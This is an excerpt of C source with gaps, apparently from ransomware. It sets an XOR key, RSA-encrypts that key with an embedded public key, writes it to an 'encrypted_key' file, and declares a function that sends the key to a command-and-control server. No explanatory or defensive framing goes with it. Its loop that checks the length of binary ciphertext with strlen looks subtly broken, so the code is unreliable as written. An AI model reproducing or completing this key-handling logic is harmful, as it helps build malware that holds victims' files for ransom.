...
void send_key_to_cnc();
void question();

void string2file(char* str);
...
int main(int argc, char* argv[])
{
    ...
    /* xor key setting */
    if (argc < 2)
        xor_key = 0xdeadbeef; // default key is 0xdeadbeef
    else
        xor_key = atoi(argv[1]);

    /* RSA Encryption */
    sprintf(xor_key_str, "%d", xor_key);
    int encrypted_length;

    do { // if encrypted key length is less than 256 -> occur padding error
        encrypted_length = public_encrypt(xor_key_str, strlen(xor_key_str), publicKey, encrypted);
        encrypted[encrypted_length] = '\0';
        if (strlen(encrypted) != 256) {
            private_decrypt(encrypted, encrypted_length, privateKey, decrypted);
        }
    } while (strlen(encrypted) != 256);
...
void string2file(char* str)
{
    FILE* fp = fopen("encrypted_key", "wb");
    fputs(str, fp);
    fclose(fp);
}
